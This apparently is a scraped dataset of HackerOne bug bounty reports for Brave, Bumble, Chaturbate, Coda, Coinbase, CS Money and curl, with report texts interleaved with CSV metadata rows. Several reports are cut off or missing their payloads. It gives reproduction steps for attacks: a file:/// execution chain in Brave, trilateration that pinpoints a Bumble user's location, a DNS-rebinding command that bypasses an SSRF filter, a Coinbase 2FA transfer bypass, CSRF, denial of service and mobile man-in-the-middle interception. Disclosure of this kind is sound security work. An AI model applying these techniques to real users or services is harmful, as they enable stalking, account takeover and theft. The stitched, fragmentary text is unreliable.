It's possible to open links pointing to file:/// origin from web pages using ""Open link in a new tab"" in context menu.

https://hackerone.com/bugs?report_id=369185 shows unsafe ssh:// protocol handling, which leads to information leak using ssh(OS username and etc.). The vulnerability is highly available, so it's possible to leverage it.

As of, we could get username, it's easy to predict path of the downloaded file:
file:///Users/${USERNAME_FROM_SSH}/Download/${DOWNLOADED_FILE_NAME}
USERNAME_FROM_SSH
When user initiates ssh session through browser, it's equal to running ssh os_username@hostname.com. So the host which receives connection request knows user's OS username.
DOWNLOADED_FILE_NAME
DOWNLOADED_FILE_NAME is download attribute of the link. That means, it's under the attacker's control.

I could provide a PoC with ""ssh step"", if it could increase a bounty. Currently, OS username is hardcoded in exploit.html. Insert your OS username to run the exploit. (e.g. using devtools or locally)


Webpage requests navigation to ssh:// -  user agrees.
Navigation happens, attacker's host received ssh connection request. Attacker knows user's OS username.
Webpage asks to download the file. Let's name it file-load.html. Downloading happens.
User opens a link(using ""Open in a new tab"") which points to file:///Users/${USERNAME_FROM_SSH}/Download/file-load.html
Navigation happens, downloaded HTML file executes on local file system.

Impact
Navigation from web pages to file:/// and executing downloaded (from the web) files on local filesystem is definitely a vulnerability, which additionally opens a wider attack surface for an attacker.

Executable files downloaded through Brave don't have quarantine attribute.
That means it's possible to launch any executable bypassing codesigning + quarantine.
However, later I found that Brave has already tracked similar report but only in the context of .pkg files. 
Additionally, Brave is allowed to run apps in Terminal. It was already shown in 369185 that Brave has more permissions on Terminal than it should have => It is possible to execute downloaded files in Terminal by click(double click) in Brave ""Downloads"" toolbar.
macOS doesn't have executable files that could be launched without installation after downloading from the web. Files like .command and .tool could be executed in Terminal and only if they have -x, but these files downloaded from the web have only -rw.
However, it's possible to download and launch Java archives, because they're archives => executable after downloading.

As far as I know, Java isn't installed by default. That means only macOS users with Java installed are affected by this problem.

Impact

Java isn't installed on macOS by default (as I know), that's why it's not critical.

Users with installed Java could run any downloaded through Brave java archive from Downloads toolbar bypassing quarantine + code-signing checks in one click (double click).
I think this isn't a duplicate, because this attack scenario leverages two vulnerabilities (quarantine + Brave permissions over Terminal).

The fact that downloaded files aren't in quarantine by itself doesn't show that it's possible to execute any app by click. However, Brave's permissions over Terminal introduce that.

Brave Software,101-250,0.0,10m-50m,$50.00,Low,3.1,None,Unsafe handling of protocol handlers,"metnew  submitted a report to Brave Software.Jun 20th (4 years ago)Summary:
Brave browser (macOS) handles protocol handlers in unsafe way (and differently from other browsers).
Key differences between protocol handlers handling in Brave and other browsers:
Open external app vs Open ""Terminal""
Brave only asks about opening external app.
Other browsers (e.g. Chrome) asks about opening a specific app. 
Try to open a ssh:// link in Chrome: browser opens a popup with a question similar to ""Do you want to open ""Terminal""?"" 
Opening ssh:// in Brave results in a popup with a content similar to : ""Do you want to open external app for ssh://""

Sorry, I didn't remember actual popups' content + I've got RU version

Impact
User doesn't know which app will be opened after allowing to open an external app.
That means it easier for attacker to trick user to open an external app in Brave compared to other browsers.
This applies to all protocol handlers in Brave browser, not only ssh:// or telnet://.
ssh:// and telnet:// without confirmation
In Chrome/Safari/FF, after opening Terminal using ssh:// link, Terminal shows an alert with a text similar to ""Do you want to initiate ssh session with *example.com?"".
Next things worth noting:

There is an additional confirmation dialog in Terminal while navigating to ssh:// through browser.
Default answer in the confirmation dialog is negative. (""Don't connect"")
example.com: user sees exact host

Brave browser initiates ssh:// and telnet:// sessions automatically after opening the external app (Terminal) without confirmation messages.
If browser handles ssh:// URLs  by default, any iframe with src=""ssh://example.com"" could automatically start ssh session without user's interaction.  Additionally, it's possible to silently initiate ssh connection, by running alert() on window.onblur event - Terminal isn't visible in this case.
Same applies to telnet:// too.

Steps To Reproduce:


Open exploit.html


Click ssh://google.com link


Allow opening an external app


Terminal launched without additional alerts/warnings


Open exploit.html


Click ssh://google.com link


Remember ssh:// (set as default handler)


Add iframe <-- Any iframe could automatically trigger ssh connection without confirmation


Impact


No confirmation message for external apps. - definitely bad behavior. Brave handles all protocol handlers in this way, not only ssh:// || telnet://


SSH connection without confirmation - ssh sessions leak important user info: IP, username, etc. Also, it opens a wider attack surface.


If ssh:// is allowed to open by default (i.e. ""remembered""): Any iframe could automatically trigger ssh session. It's possible to start ssh session without user's notice by calling alert() after navigation to ssh://


Terminal doesn't alert hostname in confirmation dialog (because of no confirmation dialog), so it's possible to spoof host to which user connects. 


Example/Attack scenario for #4:

link points to ssh://abc.xyz and the text of the link is ""Connect to google.com"". 
User clicks and initiates connection to abc.xyz. 
In most cases host will be visible in terminal tab's header. However, because ssh command isn't printed in terminal output while navigating through ssh:// URLs, it's ease to not notice real host name and continue treat it as google.com.

Open an existing chat.
Looking at the traffic log, notice an outgoing POST request to https://am1.bumble.com/mwebapi.phtml?SERVER_OPEN_CHAT, retrieving the chat messages from the backend.
Observe the response to the aforementioned request: it contains an array of chat_messages, where each badoo.bma.ChatMessage contains a boolean key read, displaying the read status of the message.

Impact
The Bumble app implies that the read status of messages is not shared with others, due to the fact that it shows a ""delivered"" status below messages, while never showing a read status. Due to the information disclosure in the aforementioned API endpoint, users may view the read status of all messages within their chats, potentially violating the privacy of the user on the other end (who most likely expects this information to be kept private).Summary by ndrongThe Bumble app allows matches to chat with each other. In the mobile apps it is possible to see whether a message has been delivered (the webapp does not offer this feature), but the read status of messages is never disclosed. However, by issuing a POST request to an API endpoint, it was possible for users to retrieve the read status of individual messages within all of their chats. Bumble has resolved this issue by always returning a read status of false, regardless of the actual read status of a message.",https://hackerone.com/reports/1080437,Texas,United States,Austin,2021,1,17,18,39
Bumble,1001-5000,0.0,10m-50m,"$2,000.00",High,7.95,Information Disclosure,Exfiltrating a victim's exact location (to within 5m),"robertheaton  submitted a report to Bumble.Jun 15th (about 1 year ago)I used Bumble's distance feature to exfiltrate the exact location (to within approx 5m) of a victim. I did this by using the Bumble API to move my attacker account's location around the approximate area of the victim. I was able to obtain the exact distance between attacker and victim at 3 separate locations, and I then used trilateration (https://gis.stackexchange.com/questions/17344/differences-between-triangulation-and-trilateration) to combine these 3 distances into a single, precise location.
This is not a new vulnerability; Tinder was found to be vulnerable to a version of it in 2014 (https://blog.includesecurity.com/2014/02/how-i-was-able-to-track-the-location-of-any-tinder-user/). What is new is the circumvention of Bumble's attempted mitigations for the Tinder attack. Tinder was trivially vulnerable to trilateration because their API returned the exact distance between attacker and victim, to 15 decimal places, and the client was responsible for rounding it. Bumble attempts to mitigate this by rounding the distance on the server, and returning only this rounded distance to the client. Simple trilateration is still possible using these rounded values, but this only gives us an accuracy of the nearest square mile or so.
However, we can massively increase the precision to the nearest few metres by hypothesising that Bumble performs server-side rounding using code like the following:
Code 153 BytesWrap lines Copy Download1def calculate_rounded_distance():
2  exact_distance = calculate_exact_distance()
3  rounded_distance = math.floor(exact_distance)
4  return rounded_distance
This means that we can have our attacker slowly ""shuffle"" around the vicinity of the victim, looking for the precise location where a victim's distance from us flips from (say) 1.0 miles to 2.0 miles. We can infer that this is the point at which the victim is exactly 1.0 miles from the attacker. We can find 3 such ""flipping points"" (to within arbitrary precision, say 0.001 miles), and use them to perform trilateration as before.
To reproduce:

Create 2 accounts - a victim and an attacker. I don't believe that they need to be made to match with each other in order to exploit this vulnerability.
Use Burp Suite or similar to grab the victim and attacker session IDs so that we can control them programatically via the Bumble API
Use the Bumble API to put the victim in a fixed, target location
Put the attacker in a random location in the vicinity of the victim. The attack does not require any special knowledge of the victim's location beyond the summary shown in the UI (eg. ""Lambeth"")
Step the attacker in a random direction in small increments (smaller increments take longer but give more precise locations). After each step, check the distance between attacker and victim. If it has changed, record the average of the current and previous location as being exactly the smaller of the 2 distances away from the victim.
If desired, repeat step 5 with a smaller step size in the vicinity of the known distance flip in order to increase precision
Repeat steps 4-6 3 times starting in different positions
Draw 3 circles, 1 for each distance found. The radius should be the distance between victim and attacker, the centre should be the point at which the distance flipped. (KML viewed in Google Earth is convenient for this step)
Confirm that all 3 circles cross at the same point - you should have been able to identify the victim's location to within approx 5m

I've included a Python POC with this report, and a screenshot of trilateration results produced using this script where the victim is placed at 10 Downing Street, UK. Depending on precision desired it takes approximately 10 seconds to find a victim's location.
Impact
The Bumble API does not appear to restrict the users about whom an attacker can pull information. This means that an attacker could use this vulnerability to find the exact location of any user whose user ID they know. This includes:

Current matches
Past matches who have since broken up with them
Any user whose profile the attacker has been shown in an encounter

The only restriction I've found is that sometimes the API does not return the numerical distance between the attacker and victim. I speculate that this occurs when the victim hasn't checked in for a period of time.
To mass exfiltrate the locations of a large swathe of Bumble users, an attacker could use multiple accounts with wide filters to cycle through large numbers of encounters, collecting large numbers of user IDs and then using trilateration to find all of their locations.
Revealing the exact location of Bumble users presents a grave danger to their safety, so I have filed this report with a severity of ""High"".",https://hackerone.com/reports/1234406,Texas,United States,Austin,2021,6,15,8,44

Hi guys,
One of the features available to a Chaturbate user is the ability to upload images into photo sets. The upload functionality does not use any CSRF tokens, allowing attackers to perform CSRF attacks and upload images to a user's profile without the user's consent.
Steps To Reproduce:

Login to Chaturbate.
Browse to your profile page and upload an image.
Note the set ID of the newly created set (this is available by visiting set in the profile page. It'll be in the URL : https://chaturbate.com/photo_videos/photoset/detail/[username]/[set_id]/).
Download the poc.html file attached to this report.
Edit poc.html by replacing the number 4771110 by the set ID found at step #3.
Open poc.html and click on Submit request.
Visit your Chaturbate image set.

You'll notice that the photo set now inludes an additional image (a blank/white image).
Impact
In order for this attack to work, an attacker would need to know the correct photo set ID. Since set IDs are public information, this isn't an issue.

Chaturbate.com provides the ability for its users when in chat to ignore other users in chat rooms via DM etc by adding their camhandle name  to ignore_list via HUI
Actually this is just a POST to  /chat_ignore_list/ getting as a parameter the username which is the camhandle name in order to add the user to the ignore_list
The same can endpoint is used to unignore the username, by adding the boolen remove parameter set as true remove=1
Although the endpoint checks for the availability of the account to be ingoned or unignored, the  endpoint does not check for status: Disabled Accounts before the POST method, as all the endpoints in Chaturbate do.
Also as said on Hint,  this can be used to add and username even if not participating at Chaturbate room at the time or being online

Hint (..get me that POST command in GUI :) )
You can use Burp or any HTTP interceptor to grab and replay an ignore command while inside a chatroom to get the POST command as well. Then you can use it to POST and ignore any user even if he is not connected to any room or not Online at all 
Solution
While checking the account availability you should also check account status Disabled as well as doing on all other endpoints as well

Chaturbate,11-50,0.0,1m-10m,$400.00,Medium,5.45,Improper Authorization,Forget password link not expiring after email change.,"imran_nisar  submitted a report to Chaturbate.Sep 19th (4 years ago)I found a token miss configuration flaw in chaturbate.com, When we reset password for a user a link is sent to the registered email address but incase it remain unused and email is updated by user from setting panel then too that old token [reset link] sent at old email address remains valid.
A better explanation
1- User use reset feature to get reset link [Email : etc@x.com]
2- User came to know about his old password so remain the link unused and the token not expires
3- Now User changes his email from control panel [New email : etc11@z.com]
4- But the old reset still remains valid after email change
In-case an attacker able to get access to user's old email account he can hack his chaturbate account too via that link, so expiring the token at email change will be a better practice
Impact
The attacker can still change the password if victim thinks his/her account is compromised and decided to chnage his email",https://hackerone.com/reports/411337,California,United States,Irvine,2018,9,19,5,13

Hope you are doing good,
As i was just playing around with chaturbate.com and found that you guys does not have proper configuration for malicious script injection in website.
In Homograph attack basically attacker may able to inject some malicious script with URL.
Here i made homograph link for the ebay.com, when normal user see this link its look like normal simple text link but no its not simple link it's crafted homograph malicious script link so when user see this particular link user might be think that they are going to redirect on eBay.com but the fact that the link which add is malicious link and made from homograph encoding so when user click on this link user will redirect on some malicious website.
The IDN (Malicious link which i add in website) : https://xn--eby-7cd.com in looking it's look like eBay.com but when user click this link user will redirect on malicious website.

Prevention of this vulnerability
To prevent this vulnerability it would be safer to show the punycode version of the url so it would be apparent that something weird is going on. that is, show http://xn--eby-7cd.com/ instead of eBay.com.
you can see that how hackerone prevent this vulnerability
For instance, Here you can see that in hackerone if i am attaching punycode homograph URL but when you click on this link it will show you actual encryption URL of malicious URL : http://xn--eby-7cd.com/ - Click on this link and you will get know how to prevent this vulnerability or else you can also put prevention by adding validation on particular field for URL.

When you use the Github formula, the information from the Github API is returned by the endpoint https://coda.io/coda.CalcService/InvokeFormula. From what I understand, this endpoint expects a gRPC request. In the request is sent: the formula (Github..CodeSearch), the version of the Github pack (3.4.1), the id of the Github connection  (generated by Coda when connecting your account), the id of the document to which the Github account is linked, and the parameters for the formula.
The issue is that you can take the document id and connection id of any public document and use the formula as you please. Also, it's not required to be authenticated to make a request to the endpoint https://coda.io/coda.CalcService/InvokeFormula. It may be working as designed, so that's why I used a document created by a Coda employee for the proof of concept in case that is considered a N/A report :D
Steps To Reproduce:
Pass all requests through Burp or similar proxy to make the reproduction easier.

Make sure you are signed in https://coda.io
Go to https://coda.io/t/Git-Cherry-Pick-From-Branch_tTZJuuyHgqa/preview?useBack
If you look at the requests in Burp, you will see a request to https://coda.io/embed/igvicDMruo?viewMode=gallery&disconnected=true that is loaded in an <iframe> (it is the document you see when you load the template). ""igvicDMruo"" is the document id.
Using the document id from the last step, go to https://coda.io/internalAppApi/documents/igvicDMruo/externalConnections
The value that matters from the response is the id of the object  with name ""albertc44"". The connection id is 7b167155-731e-4913-9091-729c5bd77ee0
Go to https://coda.io/newdoc/POC
Click ""Create doc""
Click the ""Open Packs"" button at the top right. It is the puzzle piece icon between the robot and the arrows
Click ""+ Add a new Pack""
Click the ""Github"" card/box
Click the orange ""Sign in to install"" button
Click ""Authorize codaprojectapp""
Click ""You and anyone this doc is shared with""
Click ""Nobody""
Click the orange ""+"" button at the top of the document
Go to ""Formula"", then ""Github"", and then click ""CodeSearch""
In the dialog opened press the key ""Tab"", enter comma ,, enter ""secret"", enter ,, enter organization: ""kr-project"" and finally press the key ""Enter""
In Burp Proxy or similar, find the last request to /coda.CalcService/InvokeFormula and send it to the Repeater or similar to modify
Remove the Cookie header 
The value between $ and 2$ is the connection id. Replace this value with the 7b167155-731e-4913-9091-729c5bd77ee0 you got before (don't touch the 2 before the $ 😅 )
The first ten characters of the last line are the document id. Replace it with the document id you got in the first steps (igvicDMruo)
Send the request

When adding a pack, a post request is sent to https://coda.io/internalAppApi/documents/[doc ID]/packs with data {""packId"":[pack Id]} where doc ID is the id of doc user wishes to add pack and pack ID is the pack user wants to install.
But this request is unrestricted and the user can iterate over packId to get any free/pro/disabled pack.
Steps To Reproduce:

Capture the post request while installing any pack using a proxy like Burp when you are logged in.
Change packId to desired pack's ID. A valid packId gives a 200 status and invalid gives 400.

The below post request contains packId of Google Translate Pack which is a pro pack.

Coinbase,5001-10000,0.0,10m-50m,$100.00,No value,0.0,Information Disclosure,Blacklist bypass on Callback URLs,"agarri_fr  submitted a report to Coinbase.Mar 22nd (8 years ago)In bug #47368, I was able to reach private IP addresses via the ""Test Now"" button of the ""Callback URL"" feature. Exploiting this flaw allowed me to reach the metadata server of your outbound proxy (which is, afaik, maintained by Proximo). A comment by aianus  states that callbacks are now restricted ""from hitting any RFC 6890 IP addresses and networks"". This security measure can be bypassed used DNS rebinding.
 Let's consider what happens where an URL like http://test42.sqli.nicob.net/_hostmanager/healthcheck is submitted via the ""Merchants settings"":
1) The hostname ""test42.sqli.nicob.net"" is resolved (twice) by your servers. Then the resulting IP address is checked against a blacklist. If the IP is blacklisted, the message ""Invalid callback URL"" is printed and processing stops
2) If the IP isn't blacklisted, the request is sent to the outbound proxy managed by Proximo. The proxy will resolve ""test42.sqli.nicob.net"" too, without applying a strict blacklist. Then the target URL is accessed.
In order to exploit the flaw, we need a custom DNS server. A patched copy of dnschef can be used to send different answers at different times and bypass the filter. The following command will instruct the DNS server to answer with IP #2 twice (an authorized one), then IP #1 (a blacklisted one), then back to the beginning (scheme ""221"").
Code 375 BytesWrap lines Copy Download1 # ./rebind.py --ip1=127.0.0.1 --ip2=92.243.29.213 --scheme=221

4[17:05:09] 54.162.118.12: cooking the response of type 'A' for test42.sqli.nicob.net to 127.0.0.1 [3]
The filters will see ""92.243.29.213"" and the proxy will see ""127.0.0.1"". And the Web interface will display the index page of the Web service listening on port TCP/80 of the loopback interface of the proxy server. Several ports were identified on loopback (80, 1080, 8000, 9177, ...)  and I found some unprotected URL like http://127.0.0.1:80/_hostmanager/healthcheck (which simply displays ""OK"").
Regarding exploitation:

the metadata server on 169.254.169.254 is unreachable (that's good for you!)
the pages found (:9177/status, :80/_hostmanager/healthcheck, :80/check, ...) are unproctected but not sensitive
I may have missed some URL or web servers listening on loopback (brute-force is hard because of rate limitations)

Advice: the outbound proxy should implement a blacklist restricting access to internal and private IP addresses
NB: this kind of DNS blacklist may be 1) used elsewhere by Coinbase2) exploited more easily in a different scenario",https://hackerone.com/reports/53004,California,United States,San Francisco,2015,3,22,16,26
Coinbase,5001-10000,0.0,10m-50m,"$1,000.00",No value,0.0,Improper Authentication - Generic,Bypassing 2FA for BTC transfers,"michiel  submitted a report to Coinbase.May 1st (9 years ago)Under advanced settings, users have the ability to protect their wallet by requiring two-factor confirmation when sending bitcoins. Personally, I have configured my account with the most secure option, which requires two factor confirmation when sending any amount of bitcoins. However, a flaw exists that allows an attacker with access to the account to bypass the two-factor authentication step that is required upon sending.
The vulnerability exists in the transfer feature that allows you to transfer funds between all wallets under the same account (internal transfer). This feature is only visually available when you have at least two wallets, but it is not necessary to have two wallets to exploit this vulnerability. Just makes the process a bit easier.
Easy repro steps

Enable the account security setting that requires you to enter a valid two-factor code when transferring any amount of bitcoins.
Create a second wallet and go to Manage Accounts (https://coinbase.com/accounts).
Click the Transfer button and select the wallet you want to send money from.
Under To select one of the other wallets on the account (this doesn't actually matter).
Pick an amount and hit the Transfer button. Make sure to intercept this request! Use Burp Suite for instance. The request should look similar to this:

Change the transaction[to] parameter to the Mongo BSON ID of the wallet you want to transfer the BTCs to. This can be any wallet ID outside the account you were initiating an internal transfer for. It is fairly easy to find the ID of a wallet, for example, it can be found in the DOM:

There's a simple bug here, the Coinbase Android App. ""BitCoin Wallet"" leaks the OAuth Response Code which can be obtained using adb logcat -s Coinbase command line for testing, and any Android application on the same phone can read the response code for the user by reading the logs. As of now nothing can be harmed with OAuth Response code, but along with the hardcoded client secret we can obtain the access_token.
This bug is similar to this - http://attack-secure.com/all-your-facebook-access-tokens-are-belong-to-us/

Coinbase,5001-10000,0.0,10m-50m,$100.00,No value,0.0,Cryptographic Issues - Generic,Coinbase Android Security Vulnerabilities,"bryanstern  submitted a report to Coinbase.Mar 11th (9 years ago)My name is Bryan Stern and I am Android Software Engineer. Last night I took another look at your Android application and found some disturbing vulnerabilities that could allow for a user's account to be hijacked. Fortunately, they are very easy to resolve. Below I have outlined the issue, gave some recommendations, and attached some screenshots.
Coinbase for Android Security Flaws:

The application does not perform any SSL certificate verification.
The API design does not prevent request tampering or replays.
The consumer id and secret of the app is widely available.

Potential for damage:

Without implementing your own SSL certificate validation in the Coinbase app, a ""man in the middle"" can sniff and alter communication between the application and Coinbase API. A malicious hacker could then use this to violate user privacy as well as take advantage of the other two flaws listed. Worse, an attacker could steal the access token provided in network responses and have full API access to the user's Coinbase account using the widely available Coinbase Android consumer id and secret.
Because requests are neither adequately protected by SSL, nor are they signed, an attacker could repeat or tamper with requests. For example, an attacker could repeat requests to buy bitcoin, sell bitcoin, or send bitcoin requests from the app to either empty their associated bank account, sell bitcoins needed by the user, or repeat a transfer bitcoins to another account. Not only can transactions be repeated, they can be modified in transit. So, for example, an attacker could change the recipient (and/or amount) of a transaction request.
The consumer id and secret exposure means that their is no trusted secret between the Coinbase Android app and the Coinbase API. This means any program could make requests to the Coinbase API pretending to be the Coinbase Android app. You would not be able to block the abuser of the Coinbase API without disabling the Coinbase Android app until a new build with a new consumer id and secret was distributed.

How to establish the man in the middle attack on Android

Set up a proxy server that the Android device will route traffic through. I use www.charlesproxy.com for this.
Install the SSL certificate on the device that the proxy will present as Coinbase's SSL certificate to it's clients. (www.charlesproxy.com/charles.crt)
Configure your device to point it's traffic through Charles.
Enable SSL 
View, repeat, and modify requests in Charles Proxy.

Availability of the Consumer Id and Secret

It is publicly available in the GitHub repository. (https://github.com/coinbase/coinbase-android/blob/bc6a03229416736acc2ea6bc2fb13f55f7029751/coinbase-android/src/com/coinbase/api/LoginManager.java#L49)
It is visible in many requests made by the device when monitoring requests during the man in the middle attack.

Recommendations:

Read the Android Documentation on SSL. 
Sign OAuth requests and use nonces. See Twitter's documentation for an example. https://dev.twitter.com/docs/auth/creating-signature
Change your consumer id and secret and keep them confidential. There is no need to ever send the consumer secret if requests are signed using it.
Based on the available source code, I see that ProGuard is not being used. I highly recommend it both to obfuscate your compiled code and for some of the optimizations available.


Please let me know how much time you may need to resolve these issue as I would like to publish this on my own blog soon (~3 weeks). If you have any questions, I would be more than happy to answer any questions and walk your developers through the issues.

The CSRF part you can ignore, since the hacker can inject XSS in the support, then send a message (as support) with the XSS image to every user.
Yeah, it is a massive XSS, tons of users would be affected.
In the comments I explain I little better.",https://hackerone.com/reports/1010466,Washington,United States,Bellevue,2020,10,17,4,17

Greetings,
Hello Team,
I have found a Content Spoofing/Text Injection on this domain https://support.cs.money
Using the below link the attacker can trick any genuine user to go to the attacker's phishing site.
The attacker could craft the URL by providing discounts which will tempt the user to visit the attacker URL mentioned, as the site displaying the message still belongs to https://support.cs.money
Steps To Reproduce
POC URL

Issue 2 - worker.js file is user-readable
https://cs.money/js/worker.js?language=en&v=1331&csrf_token=[removed]
The worker.js contains a lot of business logic which is deployed in production whiteout being minified or uglified. This might lead an attacker to craft attacks in future as it uses

I had gone through your policy and I saw that DoS is out of scope but I am not sure about Application level DoS. The another reason to report  this attack because it affects  real customers who want to chat with your support team. I had tested this with two accounts 

From Account 1 I had tried to send 64K * 64K resolution image 
Simultaneously from Account 2 I had tried to  send normal image (with different Internet Connection).
The response was 502 for both images.

Steps To Reproduce:

Go to cs.money and login with Account1, Login Account2 on different device with different Internet Connection.
Now Find Support symbol.
Click on attachments and upload ""lottapixel.jpg""  from Account1. 
Simultaneously upload normal image from Account2.

If you need more information please let me know.

[attachment / reference]
From: Device 1,  Account1
Image ""lottapixel.jpg"" is Payload
Image ""502.PNG"" is proof of attack is successful.

From: Device 2, Account2
Image ""upload timing from account2.png"" and ""Account2.png""  is proof that real users are also affected.
Impact
Real User are not able to send images to the support team.  It affects to the availability  of resource.  I had recorded 1.2 min downtime.

CS Money,51-100,0.0,100m-200m,$200.00,Medium,4.1,Denial of Service,Server-side denial of service via large payload sent to wiki.cs.money/graphql,"michaelrowley  submitted a report to CS Money.Sep 28th (2 years ago)Summary:
By sending a large payload to wiki.cs.money, a malicious actor can cause a partial or full denial of service to other users using the graphql part of wiki.cs.money
Steps To Reproduce:


Setup burpsuite as a proxy


Go to burpsuite -> Proxy -> Options -> Match & Replace


Click add


ITEM = Request parameter value, Match = search_ten, Replace = YOUR_LONG_STRING. (my long string is a 35,520,000 character long '?' string.


Go to wiki.cs.money


Disable interception


spam random characters into the search box
You need to wait a minute or so for the denial of service to reflect in other users' devices, I presume that this is because the server needs to try to process such long strings.
## You have now caused a DoS.


Open a new browser that does not have a proxy connected, maybe on a separate connection to be sure.


Browse to wiki.cs.money


Try to use the search feature


F12


Go to timings


Examine!

Supporting Material/References:
It is possible that this is a site-wide vulnerability, on other parts of the website (main base domain cs.money) I noticed that Cloudflare protected the site from long payloads, maybe implement that here too!

Impact
People would not be able to use any services that require /graphql on wiki.cs.money

CS Money,51-100,0.0,100m-200m,$300.00,Medium,5.45,Cross-Site Request Forgery (CSRF),Site-wide CSRF on Safari due to CORS misconfiguration (not localhost),"nnez  submitted a report to CS Money.Sep 7th (2 years ago)Description
Hello there, on new.cs.money or cs.money, there is anti-CSRF mechanism, which is Referer header check.
However, I discovered that regex logic for checking Referer header is flawed.
I found that adding { or } at the end of the domain pass the validation.
Therefore, if a request comes from new.cs.money{.attacker.com it would pass validation.
And because there is no other protective mechanisms in place (SameSite flag, Origin check, Content-Type check), thus allowing attacker to perform CSRF attack on victim.
According to this research, https://www.corben.io/advanced-cors-techniques/
Unlike other browsers, Safari will load the domain with weird characters like { or } in it.
You can try this by accessing new.cs.money{.withgoogle.com on Safari and Chrome then see the differences.
Steps To Reproduce
These steps are gonna demonstrate how an attacker can perform CSRF attack forcing user to change_email on this endpoint https://new.cs.money/change_email
1.Open Safari on MacOS, login on new.cs.money (you also need steam account to do this)
2.Open new tab on safari, and navigate to new.cs.money{.withgoogle.com
I want to note that new.cs.money{.withgoogle.com can be hosted on attacker site like, new.cs.money{.attacker.com. However, I'm still on the process of buying new domain, so I'm gonna come back and provide you with another way to exploit this with my domain. But I think that these steps are also enough for PoC
3.Inspect element to bring up javascript console (To enable dev tool, please refer to https://stackoverflow.com/questions/40234993/how-to-inspect-element-using-safari-browser)
4.Go to JS console, paste below code and hit enter

Impact
Because new.cs.money and cs.money implement anti-CSRF mechanism the same way, and use it in all endpoints, therefore, it could lead to site-wide CSRF attack on any endpoints. I can't test Cash Out function yet because I can't access it, but I set the severity to high because of this.

curl,1-10,1.0,under-1m,$500.00,Low,2.0,Information Disclosure,Connect-only connections can use the wrong connection,"m42a  submitted a report to curl.Jul 31st (2 years ago)Summary:
If a connect-only easy handle is not read from or written to, its connection can time out and be closed.  If a new connection is created it can be allocated at the same address, causing the easy handle to use the new connection.  This new connection may not be connected to the same server as the old connection, which can allow sensitive information intended to go to the first server to instead go to the second server.
This sequence of events would be uncommon in ordinary usage, so I have attached a sample program that implements a simple caching allocator, which causes the address to be re-used deterministically.
According to git bisect, this behavior was introduced in commit 755083d.
Steps To Reproduce:

Compile the source code below
Listen on ports 1234, 1235, and 1236
Run the compiled program
Notice that the data which was supposed to be sent to port 1234 is actually sent to port 1236

Commit ""schannel: support selecting ciphers"" added support for selecting the ciphers with SCHANNEL. However, due to use of a static algIds array for ciphers in set_ssl_ciphers the last configured cipher list will override configuration used by other connections, leading to potential wrong configuration for them. This may have security implications if insecure cipher configuration is used where secure cipher configuration is expected.
Steps To Reproduce:
  1.Create two or more separate curl handles with curl_easy_init
2. Set different cipher lists with curl_easy_setopt CURLOPT_SSL_CIPHER_LIST to the curl handles
3. Create simultaneous connections with there the separate curl handles
Instead of each connection using the specific cipher list some of them will share the wrong configuration. If/how this happens exactly depends on how the connection setup overlaps.
Note that to be vulnerable some existing application using libcurl would needs to use such mixed CURLOPT_SSL_CIPHER_LIST configuration with multiple curl handles to begin with. It is not really known how likely this really is, but it seems somewhat rare use case.

lib/vtls/openssl.c ossl_connect_step1 sets up the ossl_new_session_cb sessionid callback with  SSL_CTX_sess_set_new_cb, and adds association from data_idx and connectdata_idx to current conn and data respectively:

However, it is possible that the connection is disassociated from these pointers via Curl_detach_connnection, and reassociated to a different connection via Curl_attach_connnection. Yet, Curl_detach_connnection doesn't SSL_set_ex_data the data_idx / connectdata_idx/ to NULL, nor does Curl_attach_connnection update the pointers with new ones. I am not absolutely certain but this appears to lead to a situation where a stale pointer(s) can exists when the session callback is called.

When compiled --with-libmetalink and used with --metalink curl does check the cryptographics hash of the downloaded files. However, the only indication that the hash was incorrect is a message displayed to the user. The files with incorrect hashes are left to the disk as-is.
Since curl implements the hash validation and reports incorrect hashes there might be an expectation that files with incorrect hashes would not be kept either. Since the metalink can be used with insecure protocols such as http and ftp, the hash validation might be used an actual way to verify the download integrity against tampering.
Steps To Reproduce:
  1.Configure libcurl --with-libmetalink and build libcurl
2. Have metalinktest.xml with <file name=""testfile""> containing incorrect sha-256 hash for it.
3. Execute: curl --metalink https://testsite/metalinktest.xml
The following message will be displayed:
Metalink: validating (testfile) [sha-256] FAILED (digest mismatch)
Yet, the downloaded file testfile with incorrect hash mismatch is kept.
Fix
It might be more sensible to download the file to a temporary name first, verify the hash and only then store the file to final name if the hash is correct. If hash mismatch is found remove the temporary file.

When compiled --with-libmetalink and used with --metalink  and --user curl will use the credentials for any further transfers performed. This includes different hosts and protocols, even ones without transport layer security such as http and ftp. As a result the credentials only intended for the target site may end up being sent to outside hosts, and without transport layer security, and may be intercepted by attackers in man in the middle network position.
For example HTTP redirects will not leak the credentials to other hosts unless if  --location-trusted is used, thus this is unexpected and insecure behaviour.
Steps To Reproduce:

Have metalinktest.xml with <url> referencing data on different host than testsite and using http protocol
Execute: curl --metalink --user professor:Joshua  https://testsite/metalinktest.xml

curl,1-10,1.0,under-1m,"$1,200.00",High,7.1,Improper Input Validation,CVE-2021-22924: Bad connection reuse due to flawed path name checks,"nyymi  submitted a report to curl.Jun 11th (about 1 year ago)Summary:
Curl_ssl_config_matches attempts to compare whether two SSL connections have identical SSL security options or not. The idea is to avoid reusing a connection that uses less secure, or completely different security options such as capath, cainfo or certificate/issuer pinning.
Unfortunately this function has several flaws in it:

It completely fails to take into account ""BLOB"" type certificate values, such as set by CURLOPT_CAINFO_BLOB and  CURLOPT_ISSUERCERT_BLOB. If the application can be made to initiate connection to a user specified location (where these BLOB options are not used) before the ""more secure"" connection using these options is made, the attacker can point the application to connect to the same address and port, effectively poisoning the connection cache with a connection that has been established with different cainfo or issuecert settings. This leads to attacker being able to neutralize these options and make libcurl ignore them for the connections for which they're set. I have no obvious CWE number for this one, but CWE-664 Improper Control of a Resource Through its Lifetime might fit.
CURLOPT_ISSUERCERT value is not matched. Similar to above.
Similarly, the function has an implementation flaw where path names use case-insensitive comparison for capath, cainfo and pinned public key paths. This can lead to a  situation where if the attacker can specify the capath, cainfo or pinned public key name that have a different path capitalization. Again, if the attacker can specify some of these values for the connection that is performed before the later supposedly secure connection is made, the attacker is able to make the further connection use incorrect capath, cainfo or pinned public key. This is CWE-41 Improper Resolution of Path Equivalence.
Finally, the pinned public key fingerprint set by CURLOPT_PINNEDPUBLICKEY sha256// is incorrectly compared as case-insenstive  value. If the attacker is able to create a otherwise valid certificate that has a fingerprint that has the same fingerprint string but with different capitalization (very difficult to pull off in practice), and the application could be tricked to use this value for CURLOPT_PINNEDPUBLICKEY and create a connection, later connection could be confused to think that the pinned public key is the same one.

